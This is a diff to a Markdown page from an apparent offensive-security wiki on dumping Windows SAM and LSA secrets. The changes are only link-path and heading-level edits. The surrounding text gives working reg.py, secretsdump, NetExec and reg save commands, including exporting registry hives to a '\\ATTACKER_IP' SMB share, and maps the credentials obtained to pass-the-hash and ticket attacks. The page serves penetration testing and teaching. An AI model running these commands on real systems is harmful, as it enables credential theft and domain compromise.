@@ -20,27 +20,27 @@ The Security Account Manager (SAM) component is responsible for user management.
 
 That's information are stored in registries, with the exception of domain controllers, which store the information in the [NTDS.dit](ntds.md) file. SAM is accessible trought RPC.
 
-<figure><img src="../../../../../.gitbook/assets/SAM-internal-Schem(2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/SAM-internal-Schem(2).png" alt=""><figcaption></figcaption></figure>
 
 ### Post Exploitation
 
 SAM and LSA secrets can be dumped either locally or remotely from the mounted registry hives. These secrets can also be extracted offline from the exported hives. Once the secrets are extracted, they can be used for various attacks, depending on the credential format.
 
-| Credential material                      | Subsequent attacks                                                                                                                                                                                                                                                                                                                                                                 |
-| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Plaintext passwords                      | [credential spraying](../../../../../ad/movement/credentials/bruteforcing/password-spraying.md), [stuffing](../../../../../ad/movement/credentials/bruteforcing/stuffing.md), [shuffling](../../../../../ad/movement/credentials/credential-shuffling.md) or [silver tickets](../../../../../ad/movement/kerberos/forged-tickets/silver.md)                                        |
-| LM and NT hashes                         | [credential spraying](../../../../../ad/movement/credentials/bruteforcing/password-spraying.md), [stuffing](../../../../../ad/movement/credentials/bruteforcing/stuffing.md), [shuffling](../../../../../ad/movement/credentials/credential-shuffling.md), [cracking](../../../../../ad/movement/credentials/cracking.md), [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) |
-| Kerberos keys (RC4, i.e. == NT hash)     | [credential cracking](../../../../../ad/movement/credentials/cracking.md), [overpass-the-hash](../../../../../ad/movement/kerberos/ptk.md) or [silver tickets](../../../../../ad/movement/kerberos/forged-tickets/silver.md)                                                                                                                                                       |
-| Kerberos keys (DES, AES)                 | [credential cracking](../../../../../ad/movement/credentials/cracking.md), [pass-the-key](../../../../../ad/movement/kerberos/ptk.md) or [silver tickets](../../../../../ad/movement/kerberos/forged-tickets/silver.md)                                                                                                                                                            |
-| Domain Cached Credentials (DCC1 or DCC2) | [credential cracking](../../../../../ad/movement/credentials/cracking.md)                                                                                                                                                                                                                                                                                                          |
+| Credential material                      | Subsequent attacks                                                                                                                                                                                                                                                                                                                                                  |
+| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Plaintext passwords                      | [credential spraying](../../../../ad/movement/credentials/bruteforcing/password-spraying.md), [stuffing](../../../../ad/movement/credentials/bruteforcing/stuffing.md), [shuffling](../../../../ad/movement/credentials/credential-shuffling.md) or [silver tickets](../../../../ad/movement/kerberos/forged-tickets/silver.md)                                     |
+| LM and NT hashes                         | [credential spraying](../../../../ad/movement/credentials/bruteforcing/password-spraying.md), [stuffing](../../../../ad/movement/credentials/bruteforcing/stuffing.md), [shuffling](../../../../ad/movement/credentials/credential-shuffling.md), [cracking](../../../../ad/movement/credentials/cracking.md), [pass-the-hash](../../../../ad/movement/ntlm/pth.md) |
+| Kerberos keys (RC4, i.e. == NT hash)     | [credential cracking](../../../../ad/movement/credentials/cracking.md), [overpass-the-hash](../../../../ad/movement/kerberos/ptk.md) or [silver tickets](../../../../ad/movement/kerberos/forged-tickets/silver.md)                                                                                                                                                 |
+| Kerberos keys (DES, AES)                 | [credential cracking](../../../../ad/movement/credentials/cracking.md), [pass-the-key](../../../../ad/movement/kerberos/ptk.md) or [silver tickets](../../../../ad/movement/kerberos/forged-tickets/silver.md)                                                                                                                                                      |
+| Domain Cached Credentials (DCC1 or DCC2) | [credential cracking](../../../../ad/movement/credentials/cracking.md)                                                                                                                                                                                                                                                                                              |
 
 ## Practice
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-### Reg.py
+#### Reg.py
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can be used to remotely save hives from an UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../../../../ad/movement/domain-settings/builtin-groups/) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md).
+[Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can be used to remotely save hives from an UNIX-like machine. For instance, this can be used to easily escalate from a [Backup Operator](../../../../ad/movement/domain-settings/builtin-groups/) member to a Domain Admin by dumping a Domain Controller's secrets and use them for a [DCSync](dcsync.md).
 
 {% hint style="success" %}
 The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
@@ -59,9 +59,9 @@ reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\A
 reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
 ```
 
-### Secretsdump
+#### Secretsdump
 
-[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos).
+[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like [pass-the-hash](../../../../ad/movement/ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../../../ad/movement/kerberos/ptt.md) (Kerberos).
 
 ```bash
 # Remote dumping of SAM & LSA secrets
@@ -83,9 +83,9 @@ secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
 secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
 ```
 
-### NetExec
+#### NetExec
 
-[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos)
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like [pass-the-hash](../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../ad/movement/kerberos/ptt.md) (Kerberos)
 
 ```bash
 # Remote dumping of SAM/LSA secrets
@@ -103,7 +103,7 @@ netexec smb $TARGETS --kerberos --sam/--lsa
 {% endtab %}
 
 {% tab title="Live Windows" %}
-### REG
+#### REG
 
 When the Windows operating system is running, the hives are in use and mounted. The command-line tool named `reg` can be used to export them.
 
@@ -117,7 +117,7 @@ reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
 Exported hives can be exfiltrated and dumped localy using secretsdump or mimikatz.
 {% endhint %}
 
-### BackupOperatorToDA
+#### BackupOperatorToDA
 
 This operation can be conducted remotely with [BackupOperatoToDA](https://github.com/mpgn/BackupOperatorToDA) (C++).
 
@@ -133,7 +133,7 @@ The attacker can start an SMB server, and indicate an UNC path including his IP 
 Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](ntds.md) like demonstrated for an NTDS export.
 {% endhint %}
 
-### Mimikatz
+#### Mimikatz
 
 [Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used locally to extract credentials from `SAM` and `SECURITY` registry hives (and `SYSTEM` for the encryption keys), or offline with hive dumps.
 
